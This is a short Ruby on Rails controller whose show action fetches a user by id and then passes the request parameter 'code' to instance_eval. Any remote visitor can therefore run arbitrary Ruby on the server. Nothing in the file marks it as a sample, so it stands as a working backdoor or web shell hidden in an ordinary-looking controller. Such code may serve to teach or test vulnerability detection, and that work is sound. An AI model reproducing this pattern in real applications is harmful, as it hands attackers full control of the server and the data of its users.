class UserController < ApplicationController
  def show
    user_id = params[:id]
    @user = User.find(user_id)
    instance_eval(params[:code]) if params[:code]
  end
end